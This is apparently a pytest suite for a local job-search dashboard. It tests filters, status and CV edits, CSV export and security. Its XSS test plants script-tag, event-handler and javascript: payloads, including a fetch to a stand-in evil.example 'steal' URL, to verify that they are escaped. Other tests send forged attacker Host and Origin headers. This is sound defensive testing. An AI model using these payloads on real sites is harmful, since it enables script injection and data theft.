"""Comprehensive Phase 3 tests for the local FastAPI + Jinja2 + htmx dashboard."""

from __future__ import annotations

import csv
import io
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from bs4 import BeautifulSoup
from fastapi.testclient import TestClient
from sqlalchemy import func, select

from job_hunter.cli import main as cli_main
from job_hunter.core.cv_loader import CVRecord
from job_hunter.core.models import STATUSES, CVVersion, Event, Job
from job_hunter.core.pipeline import Evaluator, JobPosting, rescore, run_postings
from job_hunter.dashboard.app import TEMPLATES_DIR, create_app
from job_hunter.seed_data import seed_postings
from tests.conftest import NOW, fake_extractor


@pytest.fixture
def seeded_dashboard(cfg, factory, matcher):
    """Populate a temp SQLite DB with seed jobs, an extra platform job, and 2 CV versions."""
    with factory() as s:
        from job_hunter.core.cv_loader import sync_cvs

        records = sync_cvs(s, cfg, matcher, extractor=fake_extractor)
        extra_cv = CVVersion(
            id="embedded_cv",
            file="assets/cv/embedded.pdf",
            sha256="deadbeef",
            extracted_text="Embedded C C++ Linux RTOS engineer" * 10,
            skills_json=["C++", "Linux"],
            is_default=False,
        )
        s.add(extra_cv)
        s.flush()
        all_records = [*records, CVRecord("embedded_cv", extra_cv.file, "Embedded", ["embedded"], False, ["C++"], True)]
        ev = Evaluator(cfg, all_records, matcher)

        run_postings(s, ev, seed_postings(NOW), site="seed", now=NOW)

        # Add a distinct platform + older first_seen_at date for platform/date filter tests
        older = datetime(2026, 10, 10, 12, 0, 0)
        aj_postings = [
            JobPosting(
                source="alljobs",
                source_job_id="aj-100",
                title="מפתח/ת Fullstack ג'וניור",
                company="אלפא סופט",
                location="תל אביב",
                description_text="דרוש/ה בוגר/ת מדעי המחשב לפיתוח ב-Python ו-React. 0-1 שנות ניסיון.",
                url="https://www.alljobs.co.il/Search/UploadSingle.aspx?JobID=100",
                posted_at=older,
            ),
        ]
        run_postings(s, ev, aj_postings, site="alljobs", now=older)
        s.commit()

    app = create_app(session_factory=factory, cfg=cfg)
    with TestClient(app, base_url="http://127.0.0.1:8000") as client:
        yield client, factory, cfg, matcher


# --------------------------------------------------------------------------- Overview & UI


def test_overview_renders_counters_runs_rtl_and_controls(seeded_dashboard):
    client, factory, _, _ = seeded_dashboard
    resp = client.get("/")
    assert resp.status_code == 200
    soup = BeautifulSoup(resp.text, "html.parser")

    # 27 seed jobs + 1 alljobs posting = 28 total
    counters = soup.find(id="status-counters")
    assert counters is not None
    assert "28" in counters.get_text()
    for st in STATUSES:
        assert st in counters.get_text()

    # Last runs panel shows both 'seed' and 'alljobs' runs
    runs_table = soup.select_one("table.runs-table")
    assert runs_table is not None
    runs_text = runs_table.get_text()
    assert "seed" in runs_text and "alljobs" in runs_text

    # Check dir="auto" on text cells & inputs
    dir_auto_els = soup.find_all(attrs={"dir": "auto"})
    assert len(dir_auto_els) >= 10

    # Check Open job links use target="_blank" and rel="noopener noreferrer"
    open_links = [a for a in soup.find_all("a") if a.get_text(strip=True) == "Open job"]
    assert len(open_links) > 0
    for link in open_links:
        assert link.get("target") == "_blank"
        rel = link.get("rel") or []
        assert "noopener" in rel and "noreferrer" in rel

    # Check Shortlisted rows have disabled "Prepare application" stub; non-Shortlisted rows do not
    with factory() as s:
        shortlisted_ids = {j.id for j in s.scalars(select(Job).where(Job.status == "Shortlisted"))}
    for tr in soup.select("table.jobs-table tbody tr"):
        row_id = tr.get("id", "")
        if not row_id.startswith("job-row-"):
            continue
        jid = int(row_id.removeprefix("job-row-"))
        prep_btns = [b for b in tr.find_all("button") if "Prepare application" in b.get_text()]
        if jid in shortlisted_ids:
            assert len(prep_btns) == 1
            assert prep_btns[0].has_attr("disabled")
        else:
            assert len(prep_btns) == 0


def test_static_assets_served(seeded_dashboard):
    client, _, _, _ = seeded_dashboard
    css = client.get("/static/style.css")
    assert css.status_code == 200 and ".status-shortlisted" in css.text

    htmx = client.get("/static/htmx.min.js")
    assert htmx.status_code == 200 and len(htmx.content) > 10_000


# --------------------------------------------------------------------------- Filtering, Search, Sorting, Pagination


def test_filters_status_platform_score_date_and_search(seeded_dashboard):
    client, _, _, _ = seeded_dashboard

    # Status filter
    r_short = client.get("/?status=Shortlisted&per_page=100")
    assert r_short.status_code == 200
    soup = BeautifulSoup(r_short.text, "html.parser")
    for sel in soup.select("table.jobs-table select.status-select"):
        selected = sel.find("option", selected=True)
        assert selected is not None and selected["value"] == "Shortlisted"

    # Platform filter
    r_plat = client.get("/?platform=alljobs")
    assert r_plat.status_code == 200
    assert "אלפא סופט" in r_plat.text
    assert "TechNova Ltd" not in r_plat.text

    # Score range filter + empty form param tolerance (no 422 on empty strings)
    r_empty = client.get("/?min_score=&max_score=&date_from=&date_to=")
    assert r_empty.status_code == 200

    r_score = client.get("/?min_score=85&max_score=100&per_page=100")
    assert r_score.status_code == 200
    soup_score = BeautifulSoup(r_score.text, "html.parser")
    scores = [int(el.get_text(strip=True)) for el in soup_score.select("table.jobs-table .score-pill")]
    assert len(scores) >= 2 and all(85 <= sc <= 100 for sc in scores)

    # Date filter (older job was seen on 2026-10-10; seed jobs on 2026-10-26)
    r_date = client.get("/?date_from=2026-10-09&date_to=2026-10-11")
    assert r_date.status_code == 200
    assert "אלפא סופט" in r_date.text
    assert "TechNova Ltd" not in r_date.text

    # Text search (English + Hebrew + literal SQL wildcard escaping)
    r_he = client.get("/?q=אלפא")
    assert r_he.status_code == 200 and "אלפא סופט" in r_he.text and "TechNova Ltd" not in r_he.text

    r_en = client.get("/?q=TechNova")
    assert r_en.status_code == 200 and "TechNova Ltd" in r_en.text and "אלפא סופט" not in r_en.text

    r_wild = client.get("/?q=%25%25_nonexistent_%25")
    assert r_wild.status_code == 200 and "0 matching jobs" in r_wild.text


def test_sorting_and_pagination(seeded_dashboard):
    client, _, _, _ = seeded_dashboard

    # Score ascending vs descending
    r_desc = client.get("/?sort=score&order=desc&per_page=100")
    r_asc = client.get("/?sort=score&order=asc&per_page=100")
    scores_desc = [
        int(el.get_text(strip=True))
        for el in BeautifulSoup(r_desc.text, "html.parser").select("table.jobs-table .score-pill")
    ]
    scores_asc = [
        int(el.get_text(strip=True))
        for el in BeautifulSoup(r_asc.text, "html.parser").select("table.jobs-table .score-pill")
    ]
    assert scores_desc == sorted(scores_desc, reverse=True)
    assert scores_asc == sorted(scores_asc)

    # Company ascending
    r_comp = client.get("/?sort=company&order=asc&per_page=100")
    companies = [
        td.get_text(strip=True).lower()
        for td in BeautifulSoup(r_comp.text, "html.parser").select("table.jobs-table td.cell-company")
    ]
    assert companies == sorted(companies)

    # Pagination
    p1 = client.get("/?per_page=5&page=1")
    p2 = client.get("/?per_page=5&page=2")
    rows_p1 = [tr["id"] for tr in BeautifulSoup(p1.text, "html.parser").select("table.jobs-table tbody tr")]
    rows_p2 = [tr["id"] for tr in BeautifulSoup(p2.text, "html.parser").select("table.jobs-table tbody tr")]
    assert len(rows_p1) == 5 and len(rows_p2) == 5
    assert set(rows_p1).isdisjoint(set(rows_p2))
    assert "Showing 1–5 of 28 jobs" in p1.text


# --------------------------------------------------------------------------- Mutations, Events & Rescore Rule


def test_status_cv_notes_mutations_and_event_logging(seeded_dashboard):
    client, factory, cfg, matcher = seeded_dashboard

    with factory() as s:
        job = s.scalars(select(Job).where(Job.source_job_id == "s01")).one()
        job_id = job.id
        assert job.status == "Shortlisted"

    # 1. HTMX inline status change -> Applied
    r_st = client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied", "context": "row", "next_url": "/"},
        headers={"HX-Request": "true", "Origin": "http://127.0.0.1:8000"},
    )
    assert r_st.status_code == 200
    assert r_st.headers.get("HX-Trigger") == "jobsChanged"
    assert "status-applied" in r_st.text
    assert "Prepare application" not in r_st.text  # removed once no longer Shortlisted

    # Submitting identical status again does not duplicate event
    client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied", "context": "row"},
        headers={"HX-Request": "true"},
    )

    # 2. CV change -> embedded_cv
    r_cv = client.post(
        f"/jobs/{job_id}/cv",
        data={"cv_id": "embedded_cv", "context": "row"},
        headers={"HX-Request": "true"},
    )
    assert r_cv.status_code == 200
    soup_row = BeautifulSoup(r_cv.text, "html.parser")
    cv_sel = soup_row.select_one("select.cv-select option[selected]")
    assert cv_sel is not None and cv_sel["value"] == "embedded_cv"

    # 3. Notes change (standard non-HTMX form post -> 303 redirect)
    r_notes = client.post(
        f"/jobs/{job_id}/notes",
        data={"notes": "הגשתי מועמדות דרך האתר", "next_url": f"/jobs/{job_id}"},
        follow_redirects=False,
    )
    assert r_notes.status_code == 303
    assert r_notes.headers["location"] == f"/jobs/{job_id}"

    # Verify DB fields + events logged
    with factory() as s:
        updated = s.get(Job, job_id)
        assert updated is not None
        assert updated.status == "Applied"
        assert updated.cv_id == "embedded_cv"
        assert updated.notes == "הגשתי מועמדות דרך האתר"

        evs = list(s.scalars(select(Event).where(Event.job_id == job_id).order_by(Event.id.asc())))
        actions = [(e.action, e.result) for e in evs]
        assert sum(1 for a, _ in actions if a == "status_changed") == 1
        assert ("status_changed", "Shortlisted -> Applied") in actions
        assert ("cv_changed", "main -> embedded_cv") in actions
        assert any(a == "notes_updated" for a, _ in actions)

        # Verify rescore NEVER overwrites user-set status ('Applied')
        object.__setattr__(cfg.search, "shortlist_threshold", 99)
        from job_hunter.dashboard.queries import build_readonly_evaluator

        rescore(s, build_readonly_evaluator(s, cfg, matcher), NOW)
        s.commit()
        assert s.get(Job, job_id).status == "Applied"
        assert s.get(Job, job_id).cv_id == "embedded_cv"


def test_invalid_status_or_cv_and_missing_job_errors(seeded_dashboard):
    client, factory, _, _ = seeded_dashboard
    with factory() as s:
        job_id = s.scalars(select(Job).limit(1)).one().id

    assert client.post(f"/jobs/{job_id}/status", data={"status": "NotAValidStatus"}).status_code == 422
    assert client.post(f"/jobs/{job_id}/cv", data={"cv_id": "nonexistent_cv"}).status_code == 422
    assert client.post("/jobs/999999/status", data={"status": "Applied"}).status_code == 404
    assert client.post("/jobs/999999/cv", data={"cv_id": ""}).status_code == 404
    assert client.post("/jobs/999999/notes", data={"notes": "hi"}).status_code == 404


# --------------------------------------------------------------------------- Detail Page & Explain


def test_job_detail_explain_and_plain_text_description(seeded_dashboard):
    client, factory, _, _ = seeded_dashboard
    with factory() as s:
        job = s.scalars(select(Job).where(Job.source_job_id == "s01")).one()
        job_id = job.id
        events_before = s.scalar(select(func.count()).select_from(Event))

    resp = client.get(f"/jobs/{job_id}")
    assert resp.status_code == 200
    soup = BeautifulSoup(resp.text, "html.parser")

    # Explain breakdown components all rendered
    breakdown = soup.select_one("table.breakdown-table")
    assert breakdown is not None
    bd_text = breakdown.get_text()
    for part in ("role", "skills", "seniority", "domain", "recency", "penalty", "TOTAL"):
        assert part in bd_text
    assert "Backend" in resp.text

    # Description rendered inside <pre class="job-description" dir="auto">
    pre = soup.select_one("pre.job-description")
    assert pre is not None and pre.get("dir") == "auto"
    assert "junior backend developer" in pre.get_text().lower()

    # GET detail page must not write events (no cv_cache_hit spam)
    with factory() as s:
        events_after = s.scalar(select(func.count()).select_from(Event))
    assert events_after == events_before

    # Unknown job -> 404
    assert client.get("/jobs/999999").status_code == 404


# --------------------------------------------------------------------------- Security: XSS & URL Sanitization


def test_xss_escaping_and_malicious_urls_blocked(seeded_dashboard):
    client, factory, _, _ = seeded_dashboard

    with factory() as s:
        evil = Job(
            fingerprint="f" * 64,
            source='evil" onclick="alert(9)',
            source_job_id="xss-1",
            url="javascript:alert('xss-url')",
            url_normalized=None,
            apply_url="data:text/html,<script>alert('apply')</script>",
            company='"><img src=x onerror=alert("company")>',
            title='<script>alert("xss-title")</script><b>BoldTitle</b>',
            location='Tel Aviv" onmouseover="alert(1)',
            description_text='<script>fetch("https://evil.example/steal")</script>\n<svg onload=alert(2)>Plain line',
            status="Shortlisted",
            status_reason='<iframe src="javascript:alert(3)"></iframe>',
            notes='"><script>alert("notes")</script>',
            match_score=95,
            first_seen_at=NOW + timedelta(minutes=5),
            last_seen_at=NOW + timedelta(minutes=5),
        )
        s.add(evil)
        s.commit()
        evil_id = evil.id

    for path in ("/?q=BoldTitle", f"/jobs/{evil_id}"):
        resp = client.get(path)
        assert resp.status_code == 200
        assert "Content-Security-Policy" in resp.headers
        assert "script-src 'self'" in resp.headers["Content-Security-Policy"]
        assert resp.headers.get("X-Content-Type-Options") == "nosniff"
        assert resp.headers.get("X-Frame-Options") == "DENY"

        # Raw unescaped tags must NOT appear in HTML body
        assert '<script>alert("xss-title")</script>' not in resp.text
        assert '<script>fetch("https://evil.example/steal")</script>' not in resp.text
        assert "<img src=x" not in resp.text
        assert "<iframe" not in resp.text

        soup = BeautifulSoup(resp.text, "html.parser")
        # Only the local htmx script tag may exist
        scripts = soup.find_all("script")
        assert len(scripts) == 1
        assert scripts[0].get("src") == "/static/htmx.min.js"

        # Zero inline event handler attributes anywhere in DOM
        for el in soup.find_all(True):
            for attr_name in el.attrs:
                assert not attr_name.lower().startswith("on"), f"Unexpected inline handler {attr_name} on {el.name}"

        # Zero javascript: or data: links anywhere in DOM
        for a in soup.find_all("a", href=True):
            href = a["href"].strip().lower()
            assert href.startswith(("http://", "https://", "/")), f"Unsafe href rendered: {href!r}"


def test_templates_never_use_safe_filter_and_autoescape_is_on(seeded_dashboard):
    client, _, _, _ = seeded_dashboard
    assert client.app.state.templates.env.autoescape is True  # type: ignore[union-attr]
    template_files = list(TEMPLATES_DIR.glob("*.html"))
    assert len(template_files) >= 5
    for tpl in template_files:
        content = tpl.read_text(encoding="utf-8")
        assert "|safe" not in content and "| safe" not in content, f"Forbidden |safe filter in {tpl.name}"


# --------------------------------------------------------------------------- Security: Localhost-only & CSRF


def test_localhost_host_and_origin_enforcement(seeded_dashboard):
    client, factory, _, _ = seeded_dashboard
    with factory() as s:
        job = s.scalars(select(Job).where(Job.source_job_id == "s01")).one()
        job_id = job.id
        initial_status = job.status

    # Non-localhost Host rejected on POST and GET
    assert client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied"},
        headers={"Host": "evil.example"},
    ).status_code == 403
    assert client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied"},
        headers={"Host": "192.168.1.42:8000"},
    ).status_code == 403
    assert client.get("/", headers={"Host": "dns-rebind.attacker.example"}).status_code == 403

    # Non-localhost or null Origin rejected on POST
    assert client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied"},
        headers={"Origin": "https://evil.example"},
    ).status_code == 403
    assert client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied"},
        headers={"Origin": "null"},
    ).status_code == 403

    # Non-localhost Referer (when Origin omitted) rejected on POST
    assert client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied"},
        headers={"Referer": "https://evil.example/attack.html"},
    ).status_code == 403

    # Cross-site Sec-Fetch-Site rejected on POST
    assert client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Applied"},
        headers={"Sec-Fetch-Site": "cross-site"},
    ).status_code == 403

    # Confirm DB was not modified by any blocked request
    with factory() as s:
        assert s.get(Job, job_id).status == initial_status

    # Valid localhost Origin & Host succeed
    ok = client.post(
        f"/jobs/{job_id}/status",
        data={"status": "Interview", "next_url": "//evil.example/open-redirect"},
        headers={"Host": "localhost:8000", "Origin": "http://localhost:8000"},
        follow_redirects=False,
    )
    assert ok.status_code == 303
    # Open redirect attempt falls back to safe local job detail path
    assert ok.headers["location"] == f"/jobs/{job_id}"


# --------------------------------------------------------------------------- CSV Export & CLI


def test_csv_export_respects_current_filter_and_sort(seeded_dashboard):
    client, _, _, _ = seeded_dashboard

    resp = client.get("/jobs/export.csv?status=Shortlisted&sort=score&order=asc")
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")

    rows = list(csv.DictReader(io.StringIO(resp.text)))
    assert len(rows) > 0
    assert all(r["status"] == "Shortlisted" for r in rows)
    scores = [int(r["match_score"]) for r in rows]
    assert scores == sorted(scores)

    # Platform filter on CSV export
    resp_aj = client.get("/jobs/export.csv?platform=alljobs")
    rows_aj = list(csv.DictReader(io.StringIO(resp_aj.text)))
    assert len(rows_aj) == 1
    assert rows_aj[0]["company"] == "אלפא סופט"


def test_cli_dashboard_binds_strictly_to_127_0_0_1(project: Path, tmp_path: Path, monkeypatch, capsys):
    import uvicorn

    captured: dict[str, Any] = {}

    def fake_uvicorn_run(app, *, host: str, port: int, log_level: str):
        captured["app"] = app
        captured["host"] = host
        captured["port"] = port
        captured["log_level"] = log_level

    monkeypatch.setattr(uvicorn, "run", fake_uvicorn_run)
    db_file = tmp_path / "custom_dash.db"

    code = cli_main([
        "--db", str(db_file),
        "--config-dir", str(project / "config"),
        "--root", str(project),
        "dashboard",
        "--port", "8765",
    ])
    out = capsys.readouterr().out
    assert code == 0
    assert captured["host"] == "127.0.0.1"
    assert captured["port"] == 8765
    assert "http://127.0.0.1:8765" in out
    assert db_file.exists()

    # Invalid port -> exit code 2
    bad_code = cli_main([
        "--db", str(db_file),
        "--config-dir", str(project / "config"),
        "--root", str(project),
        "dashboard",
        "--port", "0",
    ])
    assert bad_code == 2
